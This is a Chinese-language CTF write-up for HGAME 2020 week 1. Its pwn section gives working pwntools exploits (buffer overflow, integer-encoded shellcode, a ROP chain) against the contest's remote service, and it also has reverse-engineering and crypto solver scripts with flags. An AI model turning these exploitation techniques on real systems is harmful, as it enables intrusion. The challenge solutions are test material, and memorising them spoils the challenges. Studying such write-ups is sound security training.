# hgame2020

官方wp: [ https://github.com/vidar-team/Hgame2020_writeup ]( https://github.com/vidar-team/Hgame2020_writeup )

## pwn

### week1

#### Hard_AAAA

```python
from pwn import *
p = remote("47.103.214.163",20000)
p.recvuntil("0O0!\n")
p.sendline("A"*123+'0O0o\x00O0')
p.interactive()
```

#### Number_killer

把shellcode以整数的形式一个一个的写入就行

```python
from pwn import *

context.arch = 'amd64'

def main(host,port=20001):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./Number_Killer")
		gdb.attach(p,"b *0x000000000400787")
	p.recvuntil("numbers!\n")
	for i in range(11):
		p.sendline(str(0xcafebabe))
	sc = asm(shellcraft.sh())
	p.sendline(str(0xb00000000))
	if u64(sc[:8]) > 0x7fffffffffffffff:
		p.sendline(str(u64(sc[:8])-0x10000000000000000))
	else:
		p.sendline(str(u64(sc[:8])))
	p.sendline(str(0x0000000000400789))
	
	
	for i in range(5):
		if u64(sc[8+i*8:i*8+16]) > 0x7fffffffffffffff:
			p.sendline(str(u64(sc[8+i*8:i*8+16])-0x10000000000000000))
		else:
			p.sendline(str(u64(sc[8+i*8:i*8+16])))
	p.sendline(str(0xcafebabe))
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])
```

#### One_shot

```python
from pwn import *
p = remote("47.103.214.163",20002)
p.recvuntil("your name?\n")
p.sendline("A"*0x1f)
p.recvuntil("one shot!\n")
p.sendline(str(0x0000000006010E0-1))
p.interactive()
```

#### ROP_LEVEL0

先把`'flag'`字符串写入bss段，然后rop到

```asm
.text:000000000040069E                 mov     eax, 0
.text:00000000004006A3                 call    _open
.text:00000000004006A8                 cdqe
.text:00000000004006AA                 mov     qword ptr [rbp+fd], rax
.text:00000000004006AE                 mov     rax, qword ptr [rbp+fd]
.text:00000000004006B2                 mov     ecx, eax
.text:00000000004006B4                 lea     rax, [rbp+buf]
```

orw即可

```python
from pwn import *

context.arch = 'amd64'

def main(host,port=20003):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./ROP_LEVEL0")
		gdb.attach(p,"b *0x0000000004006EE")
	# 0x0000000000400753 : pop rdi ; ret
	# 0x0000000000400751 : pop rsi ; pop r15 ; ret
	p_rdi = 0x0000000000400753
	p_rsir15 = 0x0000000000400751
	p.recvuntil("./flag\n")
	payload = "A"*0x50+p64(0x601200)+p64(p_rdi)+p64(0)+p64(p_rsir15)+p64(0x601100)*2
	payload += p64(0x000000000400500)+p64(p_rdi)+p64(0x601100)+p64(p_rsir15)+p64(0)*2
	payload += p64(0x00000000040069E)
	p.send(payload.ljust(0x100,"\x00")+"./flag\x00\x00")
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("./libc.so.6",checksec=False)
	main(args['REMOTE'])
```

## re

### week1

#### bitwise2

我是一位一位爆破的，（不优雅，看了官方的wp，是将第⼀个数组中每个字符的奇数位和第⼆个数组中倒序的每个字符的偶数位进⾏交换,orz，逆向还是太差劲了

```c
for ( i = 0; i <= 7; ++i )
    {                                           // & > ^ > |
      v7[i] = ((v7[i] & 0xE0) >> 5) | 8 * v7[i];// 交换前3bit和后3bit
      v7[i] = v7[i] & 0x55 ^ ((v8[7 - i] & 0xAA) >> 1) | v7[i] & 0xAA;// v7[i] = v7[i]^((v8[7-i]&0xaa)>>1)
      v8[7 - i] = 2 * (v7[i] & 0x55) ^ v8[7 - i] & 0xAA | v8[7 - i] & 0x55;// v8[7-i]=v8[7-i]^(2*(v7[i]&0x55))
      v7[i] = v7[i] & 0x55 ^ ((v8[7 - i] & 0xAA) >> 1) | v7[i] & 0xAA;
    }
```

exp为：

```python
def swap_bits(c):
	return (c&0xe0)>>5 | (8*c)&0xff
v6 = [0x4C,0x3C,0xD6,0x36,0x50,0x88,0x20,0xCC]

def bf(a,b):
	for i in range(256):
		for j in range(256):
			v1 = i
			v2 = j
			v1 = swap_bits(v1)
			v1 = v1 ^ ((v2&0xAA)>>1)
			v2 = v2 ^ ((2*(v1&0x55))&0xff)
			v1 = v1 ^ ((v2&0xAA)>>1)
			if v1 == a and v2 == b:
				return i,j
          
part1 = [0x65,0x34,0x73,0x79,0x5F,0x52,0x65,0x5F]
part2 = [0x45,0x61,0x73,0x79,0x6C,0x69,0x66,0x33]

for i in range(8):
	part1[i] = part1[i]^v6[i]
	part2[i] = part2[i]^part1[i]^v6[i]^v6[i]
	
flag = [0 for i in range(16)]
for i in range(8):	
	a,b = bf(part1[i],part2[7-i])
	flag[i] = chr(a).encode('hex')
	flag[15-i] = chr(b).encode('hex')
	
print "hgame{"+''.join(flag)+'}'


```

#### maze

走迷宫，IDC脚本

```c
static main(){
    auto start_addr = 0x602080;
    auto stop_addr = 0x602480;
    auto i;
    auto count = 0;
    for(i = start_addr;i != stop_addr;i = i + 4){
        auto b = Byte(i);
        Message("%x ",b);
        count = count + 1;
        if(count % 0x10 == 0)
            Message("\n");
    }

}
```

迷宫为：

```
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
1 0 0 0 0 0 0 0 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 0 1 1 1 1 1 1 1 1 
1 1 1 1 1 1 1 0 1 0 0 0 0 1 1 1 
1 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 
1 1 1 1 1 1 1 0 0 0 1 1 0 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 0 0 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 0 1 1 
1 1 1 1 1 1 1 1 1 1 1 1 1 0 0 0 
1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 
```

#### cpp

3x3矩阵相乘

```python
import numpy as np
from numpy.linalg import *
matrixA = np.array([[1,0,1],[0,1,1],[1,2,2]])
matrixB = np.array([[0x6867,0x616D,0x65],[0x7265,0x6973,0x736F],[0x736F,0x6561,0x7379]])

flag = "hgame{"

# res = np.dot(inv(matrixA),matrixB)
res = np.dot(matrixB,inv(matrixA))
for line in res:
	for v in line:
		flag += str(int(v))+'_'
flag = flag[:-1]+'}'
print flag
# print np.dot(matrixB,matrixA)
# hgame{12134_5678_123124_1231415_123124_457_7689_89123_1231241}
```

#### advance

base64换表

```python
#!/usr/bin/env python3
import base64
import string

str1 = "0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"
# str1 = b"".fromhex('B39CB7BFB2CBD3BFB2CBD3C9B1CBD3BBAEADA3CFADCD9FBB')
# print(str1)

string1 = "abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"
string2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))
```

## crypto

### week1

#### infantRSA

只会解简单的RSA,其它的不太行了

```python
import gmpy2 
from Crypto.Util.number import long_to_bytes
c = 275698465082361070145173688411496311542172902608559859019841
p = 681782737450022065655472455411
q = 675274897132088253519831953441
e = 13
phin = (p - 1) * (q - 1)
d = gmpy2.invert(e, phin)
m = pow(c,d,p*q)
print long_to_bytes(m)
```

#### not_One-time

这题看了wp才搞出来，写脚本能力还是太差劲了

因为题目环境已经被关闭了，所有就打本地的了

题目：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os, random
import string, binascii, base64


# from secret import flag
# assert flag.startswith(b'hgame{') and flag.endswith(b'}')
flag = b"flag{this_is_Secret}"
flag_len = len(flag)

def xor(s1, s2):
    #assert len(s1)==len(s2)
    return bytes( map( (lambda x: x[0]^x[1]), zip(s1, s2) ) )

random.seed( os.urandom(8) )
keystream = ''.join( [ random.choice(string.ascii_letters+string.digits) for _ in range(flag_len) ] )
keystream = keystream.encode()
print( base64.b64encode(xor(flag, keystream)).decode() )
```

这题的密钥空间很小，才`string.ascii_letters+string.digits`,而且用的是异或来加密，所以我们每次拿到密文和密钥空间里的所有字符都异或一遍，拿多组的密文来进行此操作，就能正确解密出flag

exp为:

```python
#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import base64,string

def get_cipher():
	p = process("./not_One-time_task.py")
	cipher = p.recv()
	p.kill()
	return base64.b64decode(cipher)
flag = ''
charset = string.ascii_letters+string.digits
flagLen = len(get_cipher())
for i in range(flagLen):
	cipher = get_cipher()[i]
	flag_set = set(_ for _ in string.printable)
	flag_set = set(chr(x) for x in [ord(cipher)^ord(c) for c in charset])&flag_set
	while len(flag_set) != 1:
		cipher = get_cipher()[i]
		flag_set = set(chr(x) for x in [ord(cipher)^ord(c) for c in charset])&flag_set
	flag += flag_set.pop()
	info(flag)
	count = 0
print flag

```

我用我原先保留下来的256组密文，解出的flag：`hgame{r3us1nG+M3$5age-&&~rEduC3d_k3Y-5P4Ce}`

